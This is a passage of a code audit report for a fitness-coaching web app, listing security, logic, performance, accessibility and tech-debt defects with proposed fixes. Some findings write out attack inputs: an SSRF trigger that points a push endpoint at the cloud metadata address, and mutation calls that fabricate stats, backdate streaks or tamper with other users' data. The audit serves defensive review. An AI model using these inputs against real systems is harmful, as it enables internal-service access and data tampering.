- **Category:** Security — IDOR
- **Location:** `convex/progress.ts:39-68`
- **The Flaw:** Same `requireOwnership` short-circuit.
- **Trigger:** Coach inserts fake measurements for another coach's client.
- **Impact:** Data integrity loss; biased coach decisions downstream.
- **Proposed Fix:** Bind via identity; check coach→client relationship.

### [BUG-036] Push subscription endpoint not validated as URL (SSRF risk)
- **Severity:** 🟠 High (P1)
- **Category:** Security — SSRF
- **Location:** `convex/push.ts:42-79`, `src/app/api/push/subscribe/route.ts:34-52`
- **The Flaw:** No validation that `endpoint` is HTTPS or that the host is a known push service. Combined with B-012, attacker controls the URL the server POSTs to during cron fan-out.
- **Trigger:** Attacker registers an internal endpoint (`http://169.254.169.254/...` AWS metadata) as their push endpoint.
- **Impact:** SSRF against internal services from the Convex Node action runtime.
- **Proposed Fix:** Validate HTTPS + allowlist host suffixes (`fcm.googleapis.com`, `updates.push.services.mozilla.com`, etc.).

### [BUG-037] Suspended users can still call mutations until Clerk ban lands
- **Severity:** 🟠 High (P1)
- **Category:** Security — Suspension Bypass
- **Location:** `convex/auth.ts:28-83` (`requireRole`, `requireOwnership`)
- **The Flaw:** Neither guard checks `user.status`. Suspension is only enforced by the Clerk ban, which is async.
- **Trigger:** Suspension fires → window of ~seconds before Clerk ban → suspended user still has full backend access.
- **Impact:** Suspension partially effective; can be exploited if attacker scripts a flood of writes immediately after seeing the suspension UI.
- **Proposed Fix:** Both guards must throw if `user.status === "suspended"`.

### [BUG-038] Plan builder reaches into private RHF internals
- **Severity:** 🟠 High (P1)
- **Category:** Frontend / Maintainability / Latent Crash
- **Location:** `src/features/plan-builder/plan-builder-form.tsx:240-264, 304-309, 403`
- **The Flaw:** `control._formValues` is private react-hook-form API (underscore prefix). Direct mutation bypasses RHF's change tracking. Will silently break across RHF minor versions.
- **Trigger:** RHF release upgrade, or specific edit interactions (reset, append, removal).
- **Impact:** Form state desync, days appear duplicated, validation skips fields, submit sends stale data.
- **Proposed Fix:** Replace with public API (`useWatch`, `setValue`, `getValues`). Remove all `_formValues` references.

### [BUG-039] PR detection — current set never excluded from "previous best" in raw-weight dashboard
- **Severity:** 🟠 High (P1)
- **Category:** Business Logic / Inconsistency
- **Location:** `convex/sessions.ts:357-371` (raw-weight PR counter)
- **The Flaw:** Iterates `sessionSets` in arbitrary order (Convex `collect()` is not time-ordered) and counts every set that beats the running max. Out-of-order traversal causes false-positive PRs or undercounts.
- **Trigger:** Any client with multiple sets per exercise.
- **Impact:** `prsHit` on the coach dashboard is non-deterministic and disagrees with the Epley-based celebration.
- **Proposed Fix:** Sort sets by `completedAt` ascending before the walk. Better — unify on Epley and remove this divergent path.

### [BUG-040] `Brzycki 1RM` formula uses hardcoded `reps = 10`
- **Severity:** 🟠 High (P1)
- **Category:** Business Logic / Math Bug
- **Location:** `convex/sessions.ts:401`
- **The Flaw:** `Math.round(stats.maxWeight * (36 / (37 - 10)))` is a constant multiplier of `36/27 ≈ 1.333`. Brzycki should be `weight × (36 / (37 − reps))` with **actual reps**, not `10`.
- **Trigger:** Every render of the coach's "Top Exercises" table.
- **Impact:** Displayed Est. 1RM is always wrong, just `maxWeight × 1.333`.
- **Proposed Fix:** Track the reps that produced `maxWeight` and use them in the formula.

### [BUG-041] No focus trap / scroll lock / Escape-to-close on three admin dialogs
- **Severity:** 🟠 High (P1)
- **Category:** Accessibility — ADA Blocker
- **Location:** `src/components/admin/users/role-change-dialog.tsx`, `suspend-user-dialog.tsx`, `reinstate-user-dialog.tsx`
- **The Flaw:** Custom modal divs with `role="alertdialog"` but no focus trap, no Escape handler, no body scroll lock. Keyboard users Tab through the backdrop into the page behind.
- **Trigger:** Keyboard-only user opens any of these.
- **Impact:** Dialogs unusable without a mouse; background scroll continues; legal ADA exposure.
- **Proposed Fix:** Use `@base-ui/react` Dialog primitive or wrap in `focus-trap-react`. Add `document.body.style.overflow = 'hidden'` on open.

### [BUG-042] Pervasive WCAG AA contrast failures
- **Severity:** 🟠 High (P1)
- **Category:** Accessibility
- **Location:** Pervasive — `landing-page-client.tsx`, `user-dashboard-client.tsx`, `chat-input.tsx`, `pr-celebration.tsx`, all `text-[#c4c9ac]/40` / `/50` / `/60` instances
- **The Flaw:** `#c4c9ac` (tan) at 40–60% opacity over `#111508` (near black) yields contrast ratios around 3:1, below WCAG AA's 4.5:1 floor for body text.
- **Trigger:** Any low-vision user.
- **Impact:** Helper text, timestamps, footers, "Auto-dismissing in 3 seconds", "Type the user's email" labels effectively invisible.
- **Proposed Fix:** Raise opacity to ≥75% or use full `#c4c9ac` for all secondary text under 16px.

### [BUG-043] Chat auto-scroll fights manual scroll-back
- **Severity:** 🟠 High (P1)
- **Category:** UX
- **Location:** `src/components/messaging/chat-panel.tsx:56-58`, `src/components/messaging/message-thread.tsx:51-53`
- **The Flaw:** `useEffect` with `[messages]` dep calls `scrollIntoView` on every update, even when the user has scrolled up to read older messages.
- **Trigger:** Active conversation while reading history.
- **Impact:** Reading history is impossible during an active chat.
- **Proposed Fix:** Track "scroll position within 80px of bottom" via a ref; only auto-scroll if true.

### [BUG-044] `usePathname` can be `null` in Next 16; nav components crash
- **Severity:** 🟠 High (P1)
- **Category:** Frontend / Crash
- **Location:** `src/components/mobile-bottom-nav.tsx:42-44`, `src/components/sidebar-nav.tsx:116-117`
- **The Flaw:** `pathname.startsWith(item.href + "/")` without guarding for null. Next 16 returns null during streamed RSC payload boundaries.
- **Trigger:** Initial navigation during RSC streaming.
- **Impact:** TypeError crashes the nav, bubbles to page error boundary.
- **Proposed Fix:** `pathname?.startsWith(...) ?? false`.

### [BUG-045] `PRCelebration` z-50 collides with Sheet portal (also z-50)
- **Severity:** 🟠 High (P1)
- **Category:** UX / Z-Index
- **Location:** `src/components/gamification/pr-celebration.tsx:103`, `src/components/ui/sheet.tsx:11`
- **The Flaw:** Both at `z-50`. Render-order tiebreaker is undefined.
- **Trigger:** User hits a PR while ChatPanel sheet is open.
- **Impact:** PR celebration hidden behind the sheet (or vice versa).
- **Proposed Fix:** `PRCelebration` → `z-[70]` (above admin dialogs at `z-[60]`).

### [BUG-046] Mobile bottom nav collides with sticky-bottom CTAs
- **Severity:** 🟠 High (P1)
- **Category:** UX
- **Location:** `src/components/user/user-dashboard-client.tsx:163-185` ("Start Workout"), `src/components/user/session/session-tracker.tsx:197-207` ("Finish Workout"), `src/components/mobile-bottom-nav.tsx`
- **The Flaw:** Three competing fixed-bottom layers. "Start Workout" sits on top of the nav, or vice versa.
- **Trigger:** Mobile view of dashboard or session.
- **Impact:** Either CTA or nav is obscured.
- **Proposed Fix:** Hide `MobileBottomNav` on screens with their own sticky CTA, or `bottom-16` the CTA to clear the nav.

### [BUG-047] `ChatInput` clears textarea before mutation confirms; message text lost on failure
- **Severity:** 🟠 High (P1)
- **Category:** UX
- **Location:** `src/components/messaging/chat-input.tsx:32-41, 110-122`
- **The Flaw:** `handleSend` calls `onSend(trimmed)` and clears the textarea synchronously. The parent's `sendMessage` mutation is async. If it fails (offline, error), the textarea is empty and the user has lost their text.
- **Trigger:** Send a long message while offline or during a Convex error.
- **Impact:** User loses authored text. No retry affordance.
- **Proposed Fix:** Track pending state locally; restore text on failure; show a "sending…" indicator.

### [BUG-048] Photo upload in check-in continues on partial failure with misleading success toast
- **Severity:** 🟠 High (P1)
- **Category:** UX / Data Loss
- **Location:** `src/components/checkins/weekly-checkin-form.tsx:56-75, 77-106`
- **The Flaw:** `handleUpload` catches per-photo errors with `toast.error(...)` but the loop continues. The final `submitCheckin` is called with the truncated photo list, plus a `toast.success("Check-in submitted!")`.
- **Trigger:** One of 4 photos times out.
- **Impact:** User sees success toast but only 2 of 4 photos are stored. Trust erosion.
- **Proposed Fix:** Either fail-loud and stop on first error, or aggregate failed indices and prompt the user to confirm partial submit.

### [BUG-049] `requireRole` server helper uses untyped stringly-typed Convex call
- **Severity:** 🟠 High (P1)
- **Category:** Code Quality / Latent Crash
- **Location:** `src/lib/auth-server.ts:17`
- **The Flaw:** `convex.query("auth:getUserByClerkId" as any, ...)` bypasses type safety. Rename or move and every server component using `requireRole` silently fails at runtime → mass redirect to `/unauthorized`.
- **Trigger:** Any refactor of `convex/auth.ts`.
- **Impact:** Site-wide auth failure invisible to TypeScript.
- **Proposed Fix:** Import `api` from `@convex/_generated/api` and call `convex.query(api.auth.getUserByClerkId, ...)`.

### [BUG-050] `rateLimits.checkRateLimit` read-then-insert race creates duplicate rows
- **Severity:** 🟠 High (P1)
- **Category:** Backend Logic / Race Condition
- **Location:** `convex/rateLimit.ts:24-69`
- **The Flaw:** First-ever request from a user split into two concurrent mutations: both `unique()` return null, both insert. Subsequent `unique()` throws "expected at most one".
- **Trigger:** Concurrent first messages from a brand-new user.
- **Impact:** Rate-limit key permanently broken → user gets 500 on every message until manual cleanup.
- **Proposed Fix:** Use a deterministic doc ID (e.g., `rateLimit_${key}`) so the second insert collides, OR rely on Convex's upsert-on-id semantics.

### Additional P1 catalog (referenced; same severity)

| ID | File | One-line | Severity |
|---|---|---|---|
| BUG-051 | `convex/auth.ts:96-153` | `syncUser` race: two concurrent Clerk webhook deliveries both insert → duplicate user rows; future `findUserByClerkId.unique()` throws | P1 |
| BUG-052 | `convex/audit.ts:84` | `getAuditLogStats` does unbounded `collect()` — admin panel breaks at scale | P1 |
| BUG-053 | `convex/users.ts:22-128` | `getCoachClients` IDOR + N+1 (3 sequential queries per client) | P1 |
| BUG-054 | `convex/sessions.ts:24-33` | `getByDate` public, returns every user's sessions for a date | P1 |
| BUG-055 | `convex/plans.ts:14-20`, `sessions.ts:5-11`, `progress.ts:5-11` | `list` queries: unauthenticated full-table dump of every plan/session/progress row | P0 |
| BUG-056 | `convex/checkins.ts:121-180` | `photoStorageIds` array unbounded + not validated as user-owned (combine with B-010) | P1 |
| BUG-057 | `convex/auth.ts:177-200` | `assignCoach` admin-only but doesn't verify target has `role: "user"` — admins can assign coaches to coaches | P1 |
| BUG-058 | `convex/rateLimit.ts:113-118` | `cleanupExpired` is a public mutation (no auth) — should be `internalMutation` | P1 |
| BUG-059 | `convex/messages.ts:217-231` | Length check happens before trim — 2001-char body with trailing whitespace incorrectly rejected | P2 |
| BUG-060 | `convex/users.ts:380-383` | `volumeLast24h` overflows to `Infinity` if any `actualWeight` is poisoned (combines with B-017) | P1 |
| BUG-061 | `convex/gamification.ts:30-39` | `getUserStats` returns synthetic object missing `_id` / `userId` for fresh users — client code reading those fields crashes | P1 |
| BUG-062 | `convex/plans.ts:158-167` | "Most recent active plan" picks one when two exist; legitimate older plan silently hidden | P2 |
| BUG-063 | `src/proxy.ts:71-94` | Proxy never checks `status: "suspended"` → suspended users keep access on `/user/*` routes | P1 |
| BUG-064 | `convex/pushActions.ts` | If a user has 2 active plans (B-062), `getUsersWithActivePlans` returns 2 rows → duplicate push | P2 |
| BUG-065 | `src/components/admin/users/role-change-dialog.tsx:46-66` | Confirm button hangs if user double-clicks during async (no `finally` to reset loading) | P1 |
| BUG-066 | `src/components/messaging/chat-panel.tsx:53, 89-93` | `typingTimeoutRef` is created but never scheduled; typing indicator stays "true" for full TTL after send | P1 |
| BUG-067 | `src/components/gamification/pr-celebration.tsx:83-93` | Timer ID not cleared between back-to-back PRs; second PR auto-dismisses prematurely | P1 |
| BUG-068 | `src/components/offline-indicator.tsx:21` | `setTimeout` has no cleanup; React warns + leaks if unmount within 3s | P1 |
| BUG-069 | `src/components/checkins/photo-comparison.tsx:39-61, 47-53` | Slider has no `mousemove` window listener (cursor leaving container freezes slider) AND no touch events (broken on mobile) | P1 |
| BUG-070 | `src/lib/feature-flags.ts:31-34` | 1-second `setTimeout` poll for PostHog readiness — if PostHog loads in 1.5s, flags default to off forever | P1 |
| BUG-071 | `src/lib/analytics.tsx:24-26` | `posthog.reset()` runs in cleanup even when init was skipped → throws on hot reload without `POSTHOG_KEY` | P1 |
| BUG-072 | `src/app/admin/layout.tsx:14` | `<SidebarNav />` rendered without `user` prop in admin layout → admin sees user-role sidebar | P1 |
| BUG-073 | `src/components/user/session/session-tracker.tsx:73-76` | `!convexUser` → infinite skeleton with no retry path for users mid-Clerk-sync | P1 |
| BUG-074 | `src/app/error.tsx` (MISSING at root) | No `error.tsx` at `src/app/`, `src/app/user/messages/`, `src/app/admin/dashboard/`, `src/app/admin/users/` — errors propagate to `global-error.tsx` (no-branding NextError) | P1 |
| BUG-075 | `src/app/global-error.tsx:19` | Uses default `NextError` with statusCode=0 → uninformative "0 server-side exception" page | P2 |
| BUG-076 | `src/hooks/use-active-plan.ts:96-100, 117-121` | `weeklyProgress.completed` can exceed `total` → ProgressRing math nonsensical (>100%) | P1 |
| BUG-077 | `src/hooks/use-active-plan.ts:125-131` | Mutates Date via `now.setDate(diff)` + uses `toISOString()` (UTC) → week boundary drifts for UTC+ timezones | P1 |
| BUG-078 | `convex/__tests__/plans.test.ts` | Tests re-implement validation inline rather than invoking real Convex mutations → ZERO regression coverage | P1 |
| BUG-079 | `e2e/core-flow.spec.ts` | Only one e2e spec; no coverage of admin, billing, suspension, webhook flows | P2 |
| BUG-080 | `public/sw.js:1-3, 23-34` | Cache version constant fragmented across 3 keys; bumping one doesn't bust the others → stale JS forever after deploy | P1 |
| BUG-081 | `public/manifest.json:13-62` | Every icon declared `purpose: "any maskable"` but icons aren't designed for masking → Android home-screen clipping | P1 |

---

## 3. Business Logic & Edge Case Failures

### 3.1 Cross-Module Disagreements

| # | Issue | Locations | Impact |
|---|---|---|---|
| 1 | **PR detection algorithm divergence** | Live celebration uses **Epley 1RM** (`gamification.ts:60`); coach dashboard `prsHit` uses **raw weight** (`sessions.ts:362`); top-exercise table uses **broken Brzycki** with hardcoded `reps=10` (`sessions.ts:401`) | Three "PR" metrics disagree on whether the same set was a PR. User sees a celebration; coach sees no PR; report says Est. 1RM is `weight × 1.333`. |
| 2 | **Streak math divergence** | `gamification.updateUserStats` persists `currentStreak` with UTC midnight + "gap → reset to 1" semantics; `sessions.getClientProgressDashboard` recomputes a *different* streak that allows today to be skipped as a grace day | The number the user sees on their dashboard differs from the number the coach sees. |
| 3 | **Day-of-week resolution** | `sessions.createForToday` uses `new Date().getDay()` (server clock); `pushActions.checkWorkoutScheduledToday` uses `toLocaleDateString("en-US", { weekday: "long", timeZone: "UTC" })`. Different APIs → potentially different day names if Convex runtime locale changes | Reminder day may not match session day. |
| 4 | **Two `assignCoach` mutations** | `auth.assignCoach` (no audit, no role check on target) vs `users.assignCoachToUser` (audit + role check); coach-side UI calls the worse one | Inconsistent governance trail. |
| 5 | **Two `deleteUser` paths** | `auth.deleteUser` (no audit) vs `audit.deleteUserWithAudit` | Some deletions silently bypass the audit log. |
| 6 | **Audit action naming** | `users.ts` writes `"ROLE_CHANGE"`, `"COACH_ASSIGN"`, `"USER_SUSPENDED"` (SCREAMING_SNAKE); `audit.ts` writes `"deleteUser"`, `"updateRole"`, `"assignCoach"` (camelCase) | Action filter in `<AuditLogViewer>` cannot reliably match a known set. |
| 7 | **Dual data model** | `plans.exercises[]` and `sessions.exercises[]` are still required by the schema but new writes set them to `[]`. Normalized data lives in `planItems` / `sessionSets`. | Schema lies about what data lives where; legacy reads may produce empty results. |

### 3.2 Timezone & Date Boundary Hazards

| # | Module | Day Boundary | Hazard |
|---|---|---|---|
| 1 | `gamification.updateUserStats` | **UTC** (`Date.UTC()`) | Crashes on malformed input → `Date.UTC(NaN, …)` → `NaN` → garbage written (B-015) |
| 2 | `sessions.createForToday` | **UTC** | OK |
| 3 | `sessions.getClientProgressDashboard.workoutStreak` | **Server clock** (`new Date().setHours(0,0,0,0)`) | If Convex re-tenant changes server TZ, streak count silently shifts |
| 4 | `use-active-plan.ts` "today's day" | **Browser local time** | A user in UTC+8 logging a Monday session at 7:30 AM local has a session date of "Sunday" in UTC; dashboard says "Monday not completed" |
| 5 | `weekly-checkin-form.tsx` week number | **Browser local time**, non-strict ISO | Around year boundaries the week number can differ by ±1 across users |
| 6 | `pushActions.sendWorkoutReminders` "today" | **UTC** (`toLocaleDateString("en-US", weekday, UTC)`) | A user in PST gets Monday's reminder when their local time still says Sunday |
| 7 | `crons.ts` | **UTC** (Convex platform) | All schedules off from end-user local time |

**Verdict**: There is no coherent TZ policy. Each module picks its own boundary. The right fix is a per-user `timezone` field on `users` and a single helper that produces "today's local YYYY-MM-DD" for that user.

### 3.3 Stripe Webhook Edge Cases

| # | Scenario | What Happens | Severity |
|---|---|---|---|
| 1 | New customer's first `checkout.session.completed` | **Dropped** — `findByStripeCustomerId` returns nothing, handler `break`s. Customer paid but no Convex row exists. (B-005) | P0 |
| 2 | `customer.subscription.updated` before `customer.subscription.created` | Lookup fails; update lost | P1 |
| 3 | `invoice.payment_succeeded` arrives after `customer.subscription.deleted` | Subscription resurrected to `active` (B-006) | P0 |
| 4 | Stripe webhook retry for same `event.id` | Re-runs all side effects — duplicate `COACH_PROMOTION_VIA_BILLING` audit rows, possible double role flip (B-022) | P1 |
| 5 | Unknown Stripe status (e.g., `incomplete`, `paused`) | Defaults to `"active"` (B-007) | P0 |
| 6 | `invoice.payment_failed` mid-trial | `status: "past_due"`, but `trialing` is also a valid state; no graceful trial-failure path | P2 |
| 7 | Stripe `customer.deleted` event | **Not handled at all** — user keeps a stale subscription row pointing at a deleted customer | P1 |
| 8 | Network failure mid-handler after `upsertSubscription` succeeded but before `promoteToCoach` | Convex row updated, but user role stays `user`; manual reconciliation needed | P1 |

### 3.4 Gamification Exploits

| # | Exploit | How |
|---|---|---|
| 1 | **Insta-unlock all badges** | Call `updateUserStats({ sessionVolume: 1_000_000, sessionDate: "2026-06-21" })` once — unlocks 100K/500K/1M (B-002) |
| 2 | **Negative weight farming** | `logSet({ actualWeight: 1e15, actualReps: 1 })` → instant Epley PR (B-017) |
| 3 | **Backdated streak fabrication** | 30 sequential calls with dates `2026-05-22` … `2026-06-21` → 30-day streak badge (B-018) |
| 4 | **Stat poisoning** | `updateUserStats({ sessionDate: "broken" })` → `Date.UTC(NaN, ...)` → `lastWorkoutDate` patched to garbage → user's streak permanently broken (B-015) |
| 5 | **Cross-user vandalism** | Coach calls any gamification mutation with another user's `userId` → coach short-circuit in `requireOwnership` (B-002) |
| 6 | **PR self-promotion** | `checkForPR` excludes current session but not future-dated sessions; if a user re-logs an older session with backdated `completedAt`, they can boost their own historical 1RM |

### 3.5 Other Logic Failures

- **Conversation split-brain** (B-016): concurrent `findOrCreateConversation` calls produce two rows for the same pair.
- **Plan duplication** (B-062): no uniqueness constraint on "one active plan per client".
- **Race in syncUser** (B-051): two webhook deliveries can both insert a user row.
- **Cron retry not idempotent** (B-019, B-020): users receive duplicate emails / pushes.
- **Suspended users keep access** (B-021, B-037, B-063): no `status` check at any layer that runs synchronously.

---

## 4. Performance & Scalability Hazards

### 4.1 Unbounded Convex Reads

| Function | What it does | Impact at scale |
|---|---|---|
| `sessions.getClientProgressDashboard` | `ctx.db.query("sessionSets").collect()` then filters in memory | Reads entire `sessionSets` table every coach dashboard load. Breaks at ~16k sets. |
| `subscriptions.findByStripeCustomerId` | Full scan + memory filter | Stripe webhook latency grows linearly with sub count. Triggers retries. |
| `auth.listAllUsers` | Full scan + memory filter + N×3 per-user enrichment | Admin Users page slows linearly. Breaks at row limit. |
| `auth.getSystemHealth` | Collects `users + sessions + plans + sessionSets` | Breaks first — `sessionSets` grows fastest. |
| `audit.getAuditLogStats` | Unbounded `collect()` over `auditLogs` | Mission Control breaks after several months. |
| `progress.getCoachView` | Full table scan ignoring `by_clientId` index | Slow even at small scale. |
| `users.getCoachClients` | N×3 sequential queries per client | OK at 20 clients, slow at 200. |
| `users.getCoachMetrics` | Per-client serial loop (not `Promise.all`) | Worst of the bunch — serial. |
| `messages.getConversations` | Per-conversation batch reads of all messages just to compute `unreadCount` | Coach with 100 conversations + 50 msgs each = 5k row reads per inbox load. |
| `plans.list`, `sessions.list`, `progress.list` | Full table dumps (also security holes — see Section 2) | Both a security AND perf issue. |

### 4.2 Missing / Underused Indexes

| Defined but unused | File | Why it matters |
|---|---|---|
| `plans.by_clientId_status` | `convex/schema.ts:43` | Active-plan lookup hits `by_clientId` then filters; the composite would be a single seek. |
| `rateLimits.by_key_expiresAt` | `convex/schema.ts:230` | Cleanup cron scans by key only; the composite would target expired rows directly. |
| **Missing entirely** | | |
| `subscriptions.by_stripeCustomerId` | Required by `findByStripeCustomerId` — currently scans (B-030). |
| `auditLogs.by_actorId_timestamp` | Compound needed for actor-history filter in audit viewer once filters are restored. |

### 4.3 Cron Fan-Out Failure Modes

- `daily-workout-reminders` (`pushActions.sendWorkoutReminders`): sequential per-user loop with 4 queries + 1 HTTP call. Breaks past ~1k active users. No idempotency on retry (B-019, B-021).
- `weekly-summary-emails` (`emailActions.sendWeeklySummariesToAll`): same pattern (B-020).
- `cleanup-rate-limits`: limited to 100 rows per fire. If the table grows faster than that, it never catches up.

### 4.4 React Performance

- **No `React.memo` on table rows**: `client-table.tsx`, `users-data-table.tsx`, `audit-log-viewer.tsx`, `recent-sessions-feed.tsx`, `exercise-progression-table.tsx` — all re-render every parent re-render. At 50+ rows this is noticeable on mid-tier phones.
- **Inline closure props**: `onClick={() => doThing(x)}` in many `.map()` rows produces a new closure every render, defeating any downstream memoization.
- **Inline object props**: `style={{...}}` literals in `pr-celebration.tsx`, `progress-ring.tsx`, `mobile-bottom-nav.tsx` re-create on every render.
- **`useWatch` without selector**: `plan-builder-form.tsx:221` watches the entire form tree — every keystroke re-renders the `PlanPreview` aside.

### 4.5 Bundle / Lazy-Loading

- **Recharts is always loaded**: `volume-chart.tsx`, `mission-control.tsx`. Recharts is ~95KB gzipped. Should be `dynamic(() => import(...), { ssr: false })` since it's only used on coach/admin pages.
- **`@react-pdf/renderer` always loaded**: `report-generator.tsx` imports `PDFDownloadLink` and `PDFViewer` at the top level. The whole React-PDF runtime ships even to users who never click "Generate Report". ~250KB gzipped of pure waste.
- **`cmdk` always loaded**: `command-k.tsx` is mounted unconditionally in the admin header. Should be deferred until `Cmd+K` is first pressed.
- **`framer-motion` is NOT used** — `animations/*` uses pure CSS — but `tw-animate-css` is bundled. Fine, but evaluate if it's actually used.
- **Sentry replay sample rate at 10% in production**: 10% of all sessions ship the replay SDK. May be excessive for the bundle budget.

### 4.6 Service Worker Caching Strategy

- **Scripts cached `cache-first`** (`sw.js:49-67`): JS bundles get cached aggressively. A new deploy doesn't reach users until they manually clear the cache. Combined with B-080 (no version bump strategy), users are permanently stuck on old code.
- **No `stale-while-revalidate`** for any asset type.

---

## 5. UX, UI & Accessibility (a11y) Failures

### 5.1 Error Boundary Coverage Gaps

| Route | `error.tsx`? | `loading.tsx`? | Hazard |
|---|---|---|---|
| `src/app/` (root) | **Missing** | n/a | Landing / sign-in / sign-up crashes nuke the entire shell to `global-error.tsx` |
| `src/app/user/messages/` | **Missing** | **Missing** | Chat crashes bubble to `user/error.tsx`, but chat sheet portal-rendered errors miss the boundary |
| `src/app/user/session/` | **Missing** | **Missing** | Session tracker errors propagate to `user/error.tsx` |
| `src/app/admin/dashboard/` | **Missing** | **Missing** | Mission Control errors fall to `admin/error.tsx` (broad) |
| `src/app/admin/users/` | **Missing** | **Missing** | The page that **already crashes** (B-023) goes to `admin/error.tsx` |
| `src/app/global-error.tsx` | Renders `NextError` with status 0 | n/a | Uninformative "0 server-side exception" page |

### 5.2 Loading State Defects

| # | Component | Defect |
|---|---|---|
| 1 | `client-form.tsx` (Add Client) | Pressing Enter before `convexUser` loads silently no-ops with no feedback (B-046 in F audit) |
| 2 | `chat-input.tsx` | Clears textarea before mutation confirms; lost text on failure (B-047) |
| 3 | `role-change-dialog.tsx` | Confirm button has no `finally` reset — stale spinner state on rapid double-click (B-065) |
| 4 | `pr-celebration.tsx` | Auto-dismiss timer not cleared between back-to-back PRs (B-067) |
| 5 | `weekly-checkin-form.tsx` | Partial photo failure → misleading success (B-048) |
| 6 | `session-tracker.tsx` | `!convexUser` → infinite skeleton with no retry (B-073) |

### 5.3 Skeleton ↔ Loaded Layout Mismatch (CLS)

- `<DashboardSkeleton>` (`user-dashboard-client.tsx:190-246`) renders a `ChatPanel` button in the header; the loaded header (line 59-70) does not. → Visible header reshuffle on load.
- `<ClientTableSkeleton>` uses `zinc` colors; loaded table uses `[#444933]`. → Color flash on resolve.

### 5.4 Accessibility (WCAG 2.1 AA)

| # | Issue | Severity | Location |
|---|---|---|---|
| 1 | No focus trap on Suspend / Reinstate / RoleChange dialogs | A11y blocker | `src/components/admin/users/*-dialog.tsx` |
| 2 | No body scroll lock on those dialogs | A11y | Same |
| 3 | No Escape-to-close handler on custom dialogs | A11y | Same (custom `<div>` portal pattern) |
| 4 | Low-contrast body text pervasive (`text-[…]/40` … `/60` over near-black) | AA failure | `landing-page-client.tsx`, `user-dashboard-client.tsx`, `chat-input.tsx`, `pr-celebration.tsx`, etc. |
| 5 | `<Label>` not auto-wired to inputs — many call sites omit `htmlFor` | A11y blocker | `plan-builder-form.tsx:401`, several others |
| 6 | Mobile bottom nav labels at `text-[10px]` muted | A11y | `mobile-bottom-nav.tsx:50-55` |
| 7 | Hover-only action buttons in client table (opacity-0) | Keyboard-invisible focus | `client-table.tsx:119-154` |
| 8 | `<SignUpButton mode="modal">` wraps a `<button>` (nested buttons → hydration error) | Hydration / A11y | `landing-page-client.tsx:356-366` |
| 9 | Heading order skipped (h1 → h3) in EmptyState | Screen reader landmarks | `user-dashboard-client.tsx:273`, `coach/empty-state.tsx:27` |
| 10 | `<PRCelebration>` uses `role="alert"` + `aria-live="polite"` (conflicting semantics) | Variable SR behavior | `pr-celebration.tsx:101-107` |
| 11 | No skip-to-content link anywhere | A11y | All layouts |
| 12 | Touch targets borderline on mobile nav (64×52) | A11y AAA | `mobile-bottom-nav.tsx` |

### 5.5 Z-Index Wars

| # | Conflict | Result |
|---|---|---|
| 1 | `PRCelebration` z-50 vs `Sheet` z-50 | PR hidden behind chat sheet (B-045) |
| 2 | `MobileBottomNav` z-40 vs sticky "Start Workout" CTA z-40 | CTA overlapped by nav (B-046) |
| 3 | Custom admin dialogs z-[60] vs Sheet z-50 | OK as currently designed but undocumented |
| 4 | Toaster default z-100 vs custom dialogs z-[60] | OK |
| 5 | `OfflineIndicator` top banner z-50 vs SignIn header (no z set) | OK but fragile |

### 5.6 Mobile Responsiveness

- Cumulative bottom padding (`pb-16` on body + `pb-28` on dashboard + `pb-24` on session) leaves 6rem+ dead space on small phones (B-041 in F audit).
- `<PhotoComparison>` slider has no touch event handlers — broken on mobile (B-069).
- Sticky session header at `top-0 h-[72px]` doesn't account for iOS safe-area-inset-top.

### 5.7 Forms

- `client-form.tsx`: no `autoComplete` on the Clerk ID input.
- `weekly-checkin-form.tsx`: `Content-Type: photo.type ?? "application/octet-stream"` — empty string never falls through `??`, breaking iOS HEIC uploads (B-018 in F audit).
- `plan-builder-form.tsx`: 7-day cap UI exists but no visual feedback on what limit was hit.
- No multi-step "save draft" — if a coach navigates away mid-build, all work is lost.

---

## 6. The "Tech Debt & Cleanup" Backlog

### 6.1 TypeScript Strictness Violations

| # | Pattern | Locations |
|---|---|---|
| 1 | `as any` casts in webhook handlers | `src/app/api/webhooks/clerk/route.ts:78, 85, 88` etc.; `src/app/api/webhooks/stripe/route.ts:24-26, 31-42` etc.; `src/app/api/push/subscribe/route.ts:24-26, 46-52` |
| 2 | `as never` casts in admin UI | `src/components/admin/users/users-data-table.tsx:125-127`; `src/app/coach/clients/[clientId]/progress/page.tsx:8`; multiple `userId as never`, `clientId as never` |
| 3 | `as unknown as FunctionReference<…>` in cron | `convex/crons.ts:14, 22, 32` |
| 4 | Stringly-typed Convex calls | `src/proxy.ts:35-37`; `src/lib/auth-server.ts:17`; webhook routes throughout |
| 5 | `// eslint-disable-next-line @typescript-eslint/no-explicit-any` | Pervasive — defeats lint enforcement |

### 6.2 Dead Code / Unused Definitions

- `BADGE_DEFINITIONS` defines `pr_machine` (10 PRs) and `pr_legend` (50 PRs) — **never auto-awarded** by any code path. Either implement the trigger or remove the definitions.
- `<TrophyCase>` (`src/components/gamification/trophy-case.tsx`) — defined but not mounted in any audited page.
- `<SidebarNav>` — defined but not mounted in `<ClientLayout>`; desktop users have no left nav.
- `src/lib/validators/` — directory exists but is empty.
- `convex/auth.ts:assignCoach` — superseded by `users.assignCoachToUser`; should be removed.
- `convex/audit.ts:logAuditEvent` — vulnerable arg-based actor; should be removed in favor of identity-based variants.

### 6.3 Console Statements in Production

- `src/components/service-worker-registration.tsx:18-44` — multiple `console.log`s on SW lifecycle. Acceptable in dev, but no env gate.
- `src/app/api/webhooks/stripe/route.ts:89, 125, 234` — `console.log(\`Unhandled Stripe event…\`)`. Should be Sentry breadcrumbs.
- `src/app/api/webhooks/clerk/route.ts:115, 182` — `console.error` is OK, but the bodies should reach Sentry, not just stdout.
- `src/lib/feature-flags.ts:60, 76, 81, 85` — `console.log` debug noise that fires per event.
- `public/sw.js:104, 110` — `console.log("[SW] Background sync triggered")` is purely informational dead code.

### 6.4 Inconsistent Naming

| Category | Found | Should Be |
|---|---|---|
| Audit log actions | `"ROLE_CHANGE"` vs `"updateRole"` | Pick one convention |
| File naming | `chat-panel.tsx` (kebab) vs `RoleBadgeStyles` (PascalConst) | Already consistent in files; the constant naming inside files varies |
| Mutation naming | `suspendUser` vs `unsuspendUser` vs `assignCoachToUser` vs `updateUserRole` | OK |
| Rate-limit key format | `"messages:send"` (colon) vs `"auth:syncUser"` (colon) — but inside `syncUser` it's `\`syncUser:${id}\`` (different order from `\`${id}:messages:send\``) | Standardize order |
| Date formats | `"YYYY-MM-DD"` (sessions) vs `weekNumber: number` (checkins) vs `currentPeriodEnd: number` (subscriptions) | OK by domain |

### 6.5 Configuration Issues

